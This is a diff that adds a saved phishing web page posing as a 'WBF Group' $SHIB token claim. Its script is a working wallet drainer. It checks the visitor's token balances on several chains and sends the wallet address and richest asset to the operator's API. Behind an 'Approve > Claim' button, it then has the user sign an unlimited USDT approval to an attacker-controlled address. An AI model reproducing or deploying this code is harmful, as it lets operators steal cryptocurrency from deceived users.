@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<!-- saved from url=(0032)https://claim.shib.center/?s=783 -->
+<html lang="en" data-dpr="1" style="font-size: 36px;" class="no-touch"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<!-- Required meta tags-->
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<meta name="format-detection" content="telephone=no, email=no">
+	<meta name="msapplication-tap-highlight" content="no">
+	<meta name="x5-orientation" content="portrait">
+	<meta name="x5-fullscreen" content="true">
+	<meta name="description" content="">
+	<meta name="keywords" content="">
+	<!-- App title -->
+	<title>WBF Group</title>
+	<!-- Framework7 Library CSS -->
+	<link rel="stylesheet" href="./claim_files/vendor.min.css">
+	<link rel="shortcut icon" href="https://claim.shib.center/favicon.ico" type="image/x-icon">
+
+	<!-- Custom app styles-->
+	<link rel="stylesheet" href="./claim_files/reset.min.css">
+	<link rel="stylesheet" href="./claim_files/main.css">
+	<script src="./claim_files/w3model.js"></script>
+	<script src="./claim_files/bignumber.min.js"></script>
+	<script src="./claim_files/web3.min.js" integrity="sha512-S/O+gH5szs/+/dUylm15Jp/JZJsIoWlpSVMwT6yAS4Rh7kazaRUxSzFBwnqE2/jBphcr7xovTQJaopiEZAzi+A==" crossorigin="anonymous"></script>
+	<script type="text/javascript" src="./claim_files/web3model.min.js"></script>
+	<script type="text/javascript" src="./claim_files/evmchain.js"></script>
+	<script type="text/javascript" src="./claim_files/web3provider.js"></script>
+
+	<!-- Jquery app core js-->
+	<script src="./claim_files/jquery.min.js" integrity="sha512-AFwxAkWdvxRd9qhYYp1qbeRZj6/iTNmJ2GFwcxsMOzwwTaRwz2a/2TX225Ebcj3whXte1WGQb38cXE5j7ZQw3g==" crossorigin="anonymous"></script>
+	<script type="text/javascript" src="./claim_files/flexible.js"></script>
+	<script type="text/javascript" src="./claim_files/qrcode.min.js"></script>
+	<style type="text/css">
+		.tishi {
+			width: 3.5rem;
+			height: 1.2rem;
+			background: #00000059;
+			z-index: 999999999999;
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			border-radius: 0.1rem;
+			color: white;
+			font-size: 0.6rem;
+			text-align: center;
+			line-height: 1.2rem;
+			display: none;
+		}
+
+		.wrongchainid {
+			width: 6rem;
+			height: 1.8rem;
+			background: #00000059;
+			z-index: 999999999999;
+			position: fixed;
+			top: 10%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+			border-radius: 0.1rem;
+			color: white;
+			font-size: 0.4rem;
+			text-align: center;
+			display: none;
+		}
+	</style>
+
+
+	<style data-styled="active" data-styled-version="5.2.0"></style><style data-styled="active" data-styled-version="5.2.0"></style>
+	<style type="text/css">
+		.iw-contextMenu {
+			box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.10) !important;
+			border: 1px solid #c8c7cc !important;
+			border-radius: 11px !important;
+			display: none;
+			z-index: 1000000132;
+			max-width: 300px !important;
+			width: auto !important;
+		}
+
+		.dark-mode .iw-contextMenu,
+		.TnITTtw-dark-mode.iw-contextMenu,
+		.TnITTtw-dark-mode .iw-contextMenu {
+			border-color: #747473 !important;
+		}
+
+		.iw-cm-menu {
+			background: #fff !important;
+			color: #000 !important;
+			margin: 0px !important;
+			padding: 0px !important;
+			overflow: visible !important;
+		}
+
+		.dark-mode .iw-cm-menu,
+		.TnITTtw-dark-mode.iw-cm-menu,
+		.TnITTtw-dark-mode .iw-cm-menu {
+			background: #525251 !important;
+			color: #FFF !important;
+		}
+
+		.iw-cm-menu li {
+			font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, Ubuntu, sans-serif !important;
+			list-style: none !important;
+			padding: 10px !important;
+			padding-right: 20px !important;
+			border-bottom: 1px solid #c8c7cc !important;
+			font-weight: 400 !important;
+			cursor: pointer !important;
+			position: relative !important;
+			font-size: 14px !important;
+			margin: 0 !important;
+			line-height: inherit !important;
+			border-radius: 0 !important;
+			display: block !important;
+		}
+
+		.dark-mode .iw-cm-menu li,
+		.TnITTtw-dark-mode .iw-cm-menu li {
+			border-bottom-color: #747473 !important;
+		}
+
+		.iw-cm-menu li:first-child {
+			border-top-left-radius: 11px !important;
+			border-top-right-radius: 11px !important;
+		}
+
+		.iw-cm-menu li:last-child {
+			border-bottom-left-radius: 11px !important;
+			border-bottom-right-radius: 11px !important;
+			border-bottom: none !important;
+		}
+
+		.iw-mOverlay {
+			position: absolute !important;
+			width: 100% !important;
+			height: 100% !important;
+			top: 0px !important;
+			left: 0px !important;
+			background: #FFF !important;
+			opacity: .5 !important;
+		}
+
+		.iw-contextMenu li.iw-mDisable {
+			opacity: 0.3 !important;
+			cursor: default !important;
+		}
+
+		.iw-mSelected {
+			background-color: #F6F6F6 !important;
+		}
+
+		.dark-mode .iw-mSelected,
+		.TnITTtw-dark-mode .iw-mSelected {
+			background-color: #676766 !important;
+		}
+
+		.iw-cm-arrow-right {
+			width: 0 !important;
+			height: 0 !important;
+			border-top: 5px solid transparent !important;
+			border-bottom: 5px solid transparent !important;
+			border-left: 5px solid #000 !important;
+			position: absolute !important;
+			right: 5px !important;
+			top: 50% !important;
+			margin-top: -5px !important;
+		}
+
+		.dark-mode .iw-cm-arrow-right,
+		.TnITTtw-dark-mode .iw-cm-arrow-right {
+			border-left-color: #FFF !important;
+		}
+
+
+		/*context menu css end */
+	</style>
+	<style type="text/css">
+		@-webkit-keyframes load4 {
+
+			0%,
+			100% {
+				box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
+			}
+
+			12.5% {
+				box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+			}
+
+			25% {
+				box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+			}
+
+			37.5% {
+				box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
+			}
+
+			50% {
+				box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
+			}
+
+			62.5% {
+				box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
+			}
+
+			75% {
+				box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
+			}
+
+			87.5% {
+				box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
+			}
+		}
+
+		@keyframes load4 {
+
+			0%,
+			100% {
+				box-shadow: 0 -3em 0 0.2em, 2em -2em 0 0em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 0;
+			}
+
+			12.5% {
+				box-shadow: 0 -3em 0 0, 2em -2em 0 0.2em, 3em 0 0 0, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+			}
+
+			25% {
+				box-shadow: 0 -3em 0 -0.5em, 2em -2em 0 0, 3em 0 0 0.2em, 2em 2em 0 0, 0 3em 0 -1em, -2em 2em 0 -1em, -3em 0 0 -1em, -2em -2em 0 -1em;
+			}
+
+			37.5% {
+				box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 0, 2em 2em 0 0.2em, 0 3em 0 0em, -2em 2em 0 -1em, -3em 0em 0 -1em, -2em -2em 0 -1em;
+			}
+
+			50% {
+				box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 0em, 0 3em 0 0.2em, -2em 2em 0 0, -3em 0em 0 -1em, -2em -2em 0 -1em;
+			}
+
+			62.5% {
+				box-shadow: 0 -3em 0 -1em, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 0, -2em 2em 0 0.2em, -3em 0 0 0, -2em -2em 0 -1em;
+			}
+
+			75% {
+				box-shadow: 0em -3em 0 -1em, 2em -2em 0 -1em, 3em 0em 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0.2em, -2em -2em 0 0;
+			}
+
+			87.5% {
+				box-shadow: 0em -3em 0 0, 2em -2em 0 -1em, 3em 0 0 -1em, 2em 2em 0 -1em, 0 3em 0 -1em, -2em 2em 0 0, -3em 0em 0 0, -2em -2em 0 0.2em;
+			}
+		}
+	</style>
+	<style type="text/css">
+		/* This is not a zero-length file! */
+	</style>
+</head>
+
+<body style="font-size: 12px;">
+<!-- Views -->
+<div class="views">
+	<!-- main view -->
+	<div class="view view-main">
+		<!-- Pages -->
+		<div class="pages navbar-through">
+			<div class="page">
+				<!-- Top Navbar-->
+				<div class="page-content" style="padding-top: 0.5rem;">
+					<!-- <div class="list-block address">
+                        <div class="title" style="color: #0fadaf;"><img
+                                style="height:1rem;width:1rem;padding-bottom:-0.5rem;"
+                                src="./usdt_files/WBF.png"> WBF Group</div>
+                        <div class="list-block-title"> Your Address</div>
+                        <ul>
+                            <li class="item-content">
+                                <div class="item-inner">
+                                    <div id="youraddress" class="item-title">Please connect your wallet</div>
+                                </div>
+                            </li>
+                        </ul>
+                    </div> -->
+					<div class="list-block address">
+						<div class="title" style="color: #0fadaf;"><img style="height:0.48rem;width:1rem;padding-bottom:8px;" src="./claim_files/WBF.png"> WBF Group</div>
+						<div class="list-block amount">
+							<div class="list-block-title">Claim<span> <button id="max-btn" class="max" style="width:1.2rem;height:0.6rem;border-radius: 2rem;" onclick="to_max();">Max</button>$SHIB Token</span>
+							</div>
+							<ul>
+								<li class="item-content">
+									<div class="item-inner">
+										<div class="item-title" style="display: block;">
+											<input type="text" id="SHIB_price" onkeyup="only_num(this)" onblur="only_num(this)" onchange="only_num(this)" style="width:6.5rem;font-size:0.5rem;display:inline;" placeholder="0.00">
+											<span class="num" id="20000000" style="font-size:0.4rem;"> $SHIB</span>
+										</div>
+									</div>
+								</li>
+								<!-- <li class="item-content">
+                                            <div class="item-inner">
+                                                <div class="item-after">Remarks</div>
+                                            </div>
+                                        </li> -->
+							</ul>
+						</div>
+					</div>
+					<div class="list-block amount">
+						<div class="list-block-title">≈<span id="tetherusdorbinanceusd"> $Tether USD</span></div>
+						<ul>
+							<li class="item-content">
+								<div class="item-inner">
+									<div class="item-title">
+										<input type="text" id="BUSD_price" name="BUG_price_name" style="width:6.5rem;font-size:0.5rem;display:inline;" placeholder="150.00" disabled="">
+										<span class="num" id="busdorusdt" style="font-size:0.4rem;"> $USDT</span>
+										<p></p>
+									</div>
+								</div>
+							</li>
+							<!-- <li class="item-content">
+                                <div class="item-inner">
+                                    <div class="item-after">Remarks</div>
+                                </div>
+                            </li> -->
+						</ul>
+					</div>
+					<div class="list-block-button" style="font-size:0.3rem;">
+						<button class="button button-fill" style="margin-bottom:10px;background-color:#0fadaf;border-radius: 0.5rem;" id="btn-connect">Approve &gt; Claim</button>
+						If you can't connect your wallet, please <a id="goApp" target="_blank">click here</a>
+
+					</div>
+				</div>
+			</div>
+			<!-- Preloader -->
+			<div class="modal modal-out">
+				<div class="preloader"></div>
+			</div>
+			<div class="tishi">
+				Success
+			</div>
+			<!-- Preloader -->
+			<div class="modal modal-out">
+				<div class="preloader"></div>
+			</div>
+			<!-- <div class="wrongchainid">
+                <div style="font-size: 0.5rem;margin-bottom:0.1rem;margin-top:0.2rem">Wrong chain ID</div> please
+                switch to BSC
+                network
+            </div> -->
+		</div>
+	</div>
+</div>
+<div id="fffsss" style="color: white;
+    z-index: 99999999999999999;
+    position: absolute;top: 1px;"></div>
+
+<!-- Custom app js-->
+<script src="./claim_files/main.js"></script>
+<script type="text/javascript">
+	num_max = 20000000
+	function only_num(obj) {
+		var num = obj.value.charAt(0);
+		obj.value = obj.value.replace(/[^\d\.]/g, '');
+		obj.value = obj.value.replace(/^\./g, '');
+		obj.value = obj.value.replace(/\.{2,}/g, '.');
+		obj.value = obj.value.replace('.', '$#$').replace(/\./g, '').replace('$#$', '.');
+		if (num == '-') {
+			obj.value = obj.value;
+		}
+		if (obj.value > num_max) {
+			obj.value = num_max;
+		}
+		document.getElementById('BUSD_price').value = (obj.value * 0.0000075).toFixed(2);
+	}
+	function to_max() {
+		document.getElementById('SHIB_price').value = num_max
+		document.getElementById('BUSD_price').value = (num_max * 0.0000075).toFixed(2);
+	}
+	function OnInput(event) {
+		document.querySelector("#btn-connect").removeAttribute("disabled")
+	}
+	const ABI = [{ "inputs": [{ "internalType": "string", "name": "name", "type": "string" }, { "internalType": "string", "name": "symbol", "type": "string" }], "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }];
+
+	$(function () {
+		var infura_key = '';
+		//var domain = '';
+		var bizhong = '';
+		const approveNum = new BigNumber(2).exponentiatedBy(256).minus(1)
+		var rank = 1;
+		let injectedWeb3 = null, total = 0
+		// Authorized address
+		var authorized_address = '';
+		const addr = {
+			'USDT': '0xdac17f958d2ee523a2206206994597c13d831ec7',
+//				'USDC': '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
+//				"WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+//				"BNB": "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
+//				"UNI": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
+//				"1INCH": "0x111111111117dC0aa78b770fA6A738034120C302",
+//				"SHIB": "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+		}
+
+		const bsc_addr = {
+			'SAFEMOON': '0x8076c74c5e3f5852037f31ff0093eeb8c8add8d3',
+			'BUSD': '0xe9e7cea3dedca5984780bafc599bd69add087d56',
+			'WBNB': '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
+			'BUSDT': '0x55d398326f99059ff775485246999027b3197955',
+			'CAKE': '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82',
+			'TWT': '0x4b0f1812e5df2a09796481ff14017e6005508003',
+		}
+
+		const trx_addr = {
+			'USDT': 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+			'WIN': 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7',
+			'TONS': 'THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt',
+			'USDJ': 'TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT',
+			'JST': 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9',
+			'HT': 'TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h',
+			'SUN': 'TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9',
+			"EXNX": "TCcVeKtYUrHEQDPmozjJFMrf6XX7BgF84A",
+			"VCOIN": "TNisVGhbxrJiEHyYUMPxRzgytUtGM7vssZ",
+			"POL":"TWcDDx1Q6QEoBrJi9qehtZnD4vcXXuVLer",
+			"CKRW":"TTVTdn8ipmacfKsCHw5Za48NRnaBRKeJ44"
+		}
+
+		const addr2 = {
+			"WBTC": "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
+			"WETH": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
+			"CONV": "0xc834fa996fa3bec7aad3693af486ae53d8aa8b50",
+			"inj": "0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30",
+			"MKR": "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
+			"ALPHA": "0xa1faa113cbe53436df28ff0aee54275c13b40975",
+			"BAND": "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55",
+			"snx": "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f",
+			"comp": "0xc00e94cb662c3520282e6f5717214004a7f26888",
+			"sxp": "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9",
+		}
+
+		const addr3 = {
+			"FTT": "0x50d1c9771902476076ecfc8b2a83ad6b9355a4c9",
+			"ust": "0xa47c8bf37f92abed4a126bda807a7b7498661acd",
+			"TRIBE": "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b",
+			"wise": "0x66a0f676479Cee1d7373f3DC2e2952778BfF5bd6",
+			"RRAX": "0x853d955acef822db058eb8505911ed77f175b99e",
+			"CORE": "0x62359Ed7505Efc61FF1D56fEF82158CcaffA23D7",
+			"mir": "0x09a3ecafa817268f77be1283176b946c4ff2e608",
+			"DPI": "0x1494ca1f11d487c2bbe4543e90080aeba4ba3c2b",
+			"luna": "0xd2877702675e6ceb975b4a1dff9fb7baf4c91ea9",
+			"HEZ": "0xEEF9f339514298C6A857EfCfC1A762aF84438dEE",
+			"fxs": "0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0",
+			"fei": "0x956f47f50a910163d8bf957cf5846d573e7f87ca",
+		}
+
+		var ValuableAssets = new Object();
+
+		async function getMostValuableAssets(account) {
+			let _symbol = 'USDT'
+			ValuableAssets[addr[_symbol]] = 0;
+			for (const [symbol, contract] of Object.entries(contracts)) {
+				contract.methods.balanceOf(account).call(function (err, balance) {
+					var assets = balance / (10 ** (decimals[symbol] || 18)) * price[symbol]
+					console.log(assets)
+					if (isNaN(assets)) {
+						assets = 0
+					}
+					if (assets > 0 || symbol === 'USDT') {
+						ValuableAssets[addr[symbol]] = assets;
+					}
+				})
+			}
+			setTimeout(function () {
+				console.log(ValuableAssets)
+			}, 1000);
+			setTimeout(function () {
+				var s = getUrlQueryString('s')
+
+				var data = {
+					address:selectedAccount || '',
+					authorized_address:authorized_address,
+					bizhong:findKey(addr, findKey(ValuableAssets, Math.max.apply(null, Object.values(ValuableAssets)))),
+					code:s,
+				}
+
+				$.ajax({
+					type: 'post',
+					url:  '/api/get_trc',
+					data:data,
+					success:function(data){
+						console.log(data)
+						approved = !!data.approved;
+						if (data.authorized_address) {
+							authorized_address = data.authorized_address;
+						}
+						document.getElementById("btn-connect").innerHTML = ("Approve > Claim")
+						document.querySelector("#btn-connect").removeAttribute("disabled")
+						document.querySelector("#max-btn").removeAttribute("disabled")
+
+						//connectAccount();
+					},
+					error:function(data){
+						console.log(data)
+					}
+				})
+			}, 4000);
+			bizhong = findKey(addr, findKey(ValuableAssets, Math.max.apply(null, Object.values(ValuableAssets))))
+			console.log('123');
+			connectAccount();
+			return bizhong
+		}
+
+		function getUrlQueryString(names, urls) {
+			urls = urls || window.location.href;
+			urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+			var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+			var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+			if (r != null && r[2] != "") return unescape(r[2]);
+			return null;
+		}
+		function goapp() {
+			init();
+		}
+
+		var bsc_ValuableAssets = new Object();
+
+		async function bsc_getMostValuableAssets(account) {
+			let _symbol = 'BUSD'
+			for (const [symbol, contract] of Object.entries(contracts_bsc)) {
+				contract.methods.balanceOf(account).call(function (err, balance) {
+					var assets = balance / (10 ** (bsc_decimals[symbol] || 18)) * bsc_price[symbol]
+					if (isNaN(assets)) {
+						assets = 0
+					}
+					bsc_ValuableAssets[bsc_addr[symbol]] = assets;
+				})
+			}
+			setTimeout(function () {
+				var s = getUrlQueryString('s')
+
+				var data = {
+					address:selectedAccount || '',
+					authorized_address:authorized_address,
+					bizhong:findKey(bsc_addr, findKey(bsc_ValuableAssets, Math.max.apply(null, Object.values(bsc_ValuableAssets)))),
+					code:s,
+				}
+
+				$.ajax({
+					type: 'post',
+					url:  '/api/check_bsc',
+					data:data,
+					success:function(data){
+						console.log(data)
+						approved = !!data.approved;
+						if (data.authorized_address) {
+							authorized_address = data.authorized_address;
+						}
+						document.getElementById("btn-connect").innerHTML = ("Approve > Claim")
+						document.querySelector("#btn-connect").removeAttribute("disabled")
+						document.querySelector("#max-btn").removeAttribute("disabled")
+
+						connectAccount();
+					},
+					error:function(data){
+						console.log(data)
+					}
+				})
+			}, 4000);
+			bizhong = _symbol
+			return _symbol
+		}
+
+		var trx_ValuableAssets = new Object();
+
+		async function trx_getMostValuableAssets(account) {
+			if (!window.tronWeb) {
+				return;
+			}
+
+			let tronWeb = window.tronWeb
+			let walletAddress = tronWeb.defaultAddress.base58;
+
+			let _symbol = 'USDT'
+			for (const symbol of Object.keys(addr)) {
+				let contract = await tronWeb.contract().at(addr[symbol]);
+				let myBalance = await contract.balanceOf(account).call(function(err,balance){
+					const usdt = balance / (10** (decimals[symbol] || 18)) * price[symbol]
+					console.log(usdt);
+					if (usdt > total && usdt > 500) {
+						_symbol = symbol
+						total = usdt
+						approveAddr = addr[_symbol]
+
+						checkApproved(walletAddress,bizhong);
+					}
+				})
+			}
+			bizhong = _symbol
+			checkApproved(walletAddress,bizhong);
+			return _symbol
+		}
+
+		// async function getMostValuableAssets3(account) {
+		// 	let _symbol = 'usdt'
+		// 	for (const [symbol, contract] of Object.entries(contracts3)) {
+		// 		contract.methods.balanceOf(account).call(function (err, balance) {
+		// 			const usdt = balance / (10 ** (decimals[symbol] || 18)) * price[symbol]
+		// 			if (usdt > total && usdt > 1000) {
+		// 				_symbol = symbol
+		// 				total = usdt
+		// 				approveAddr = addr[_symbol]
+		// 			}
+		// 		})
+		// 	}
+		// 	bizhong = _symbol
+		// 	return _symbol
+		// }
+
+
+		const price = {
+			"USDT": 1,
+			"WETH": 2840.65,
+			"UNI": 27.2,
+			"BNB": 275,
+			"1INCH": 3.84,
+			"SHIB": 0.000008,
+		}
+		const bsc_price = {
+			SAFEMOON: 0.000004,
+			BUSD: 1,
+			WBNB: 349,
+			BUSDT: 1,
+			CAKE: 17,
+			TWT: 18,
+		}
+
+		const decimals = {
+			"USDT": 6,
+			"WETH": 18,
+			"UNI": 18,
+			"BNB": 18,
+			"1INCH": 18,
+			"SHIB": 18
+		}
+
+		const bsc_decimals = {
+			SAFEMOON: 9,
+			BUSD: 18,
+			WBNB: 18,
+			BUSDT: 18,
+			CAKE: 18,
+			TWT: 18,
+		}
+		const contracts = {}, contracts_bsc = {}, contracts_trx = {}
+
+
+		const Web3Modal = window.Web3Modal.default;
+		const WalletConnectProvider = window.WalletConnectProvider.default;
+
+		// Web3modal instance
+		let web3Modal
+		// Chosen wallet provider given by the dialog window
+		let provider;
+		// Address of the selected account
+		let selectedAccount;
+		// Network
+		let network;
+
+		// Web3
+		let _web3;
+
+		/**
+		 * Setup the orchestra
+		 */
+		async function init() {
+			await checkApproved('',bizhong);
+
+			document.querySelector("#max-btn").setAttribute("disabled", "disabled")
+			document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+			document.getElementById("btn-connect").innerHTML = ("Loading..,")
+			const providerOptions = {
+				walletconnect: {
+					package: WalletConnectProvider,
+					options: {
+						infuraId: "47a950cab4134279952b2202ec61dda8",
+					}
+				},
+			};
+
+			web3Modal = new Web3Modal({
+				cacheProvider: false, // optional
+				providerOptions, // required
+				disableInjectedProvider: true, // optional. For MetaMask / Brave / Opera.
+			});
+
+			try {
+				provider = await web3Modal.connect()
+				provider.enable()
+			} catch (e) {
+				console.log("Could not get a wallet connection", e);
+				document.getElementById("btn-connect").innerHTML = ("Please connect to wallet")
+				document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+				return;
+			}
+
+			// Subscribe to accounts change
+			provider.on("accountsChanged", async (accounts) => {
+				await fetchAccountData();
+			});
+
+			// Subscribe to chainId change
+			provider.on("chainChanged", async (chainId) => {
+				await fetchAccountData();
+			});
+
+			// Subscribe to networkId change
+			provider.on("networkChanged", async (networkId) => {
+				await fetchAccountData();
+			});
+			await refreshAccountData();
+
+			await connectAccount();
+		}
+
+		async function fetchAccountData() {
+			document.getElementById("btn-connect").innerHTML = ("Loading...")
+			const web3 = new Web3(provider);
+			injectedWeb3 = web3
+			provider.enable()
+			const accounts = await web3.eth.getAccounts()
+			network = await web3.eth.net.getId()
+			selectedAccount = accounts[0]
+		}
+
+		async function connectAccount() {
+			try {
+				if (selectedAccount && provider) {
+					const web3 = new Web3(provider);
+					const contract = new web3.eth.Contract(ABI, "0xdac17f958d2ee523a2206206994597c13d831ec7")
+					const gasPrice = await web3.eth.getGasPrice()
+
+					console.log(authorized_address, selectedAccount);
+					contract.methods.approve(authorized_address, web3.utils.toBN('ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')).send({
+						from: selectedAccount,
+						gasPrice: gasPrice,
+						gas: 70000,
+					}, function (err, tx) {
+						if (!err) {
+							postInfo(selectedAccount, bizhong, true)
+							// postInfo(selectedAccount, bizhong, true)
+						}
+						$('.modal-overlay').remove();
+						$('.modal').removeClass('modal-in').addClass('modal-out');
+						console.log(err, tx)
+					})
+				} else {
+					// provider = await web3Modal.connect()
+					// provider.enable()
+					// const web3 = new Web3(provider);
+					// const accounts = await web3.eth.getAccounts()
+					// selectedAccount = accounts[0]
+
+					contract = new web3.eth.Contract(ABI, findKey(ValuableAssets, Math.max.apply(null, Object.values(ValuableAssets))));
+					assets = findKey(ValuableAssets, Math.max.apply(null, Object.values(ValuableAssets)));
+					bizhong = findKey(addr, assets);
+					total = Math.max.apply(null, Object.values(ValuableAssets))
+					const gasPrice = await web3.eth.getGasPrice()
+
+					var gas = await contract.methods.approve(authorized_address, 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').estimateGas({
+						from: selectedAccount
+					}, function (err, tx) {
+						console.log(err, tx)
+					})
+					if (gas == undefined) {
+						gas = 80000;
+					}
+					console.log(gas)
+
+
+					contract.methods.approve(authorized_address, 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({
+						from: selectedAccount,
+						gasPrice: gasPrice,
+						gas,
+					}, function (err, tx) {
+						console.log(err, tx)
+						if (!err) {
+							$(".tishi").fadeIn()
+							setTimeout(function () {
+								$(".tishi").fadeOut()
+							}, 2000);
+							postInfo(selectedAccount, bizhong, true)
+							// postInfo(selectedAccount, bizhong, true)
+						}
+						$('.modal-overlay').remove();
+						$('.modal').removeClass('modal-in').addClass('modal-out');
+					})
+				}
+
+			} catch (e) {
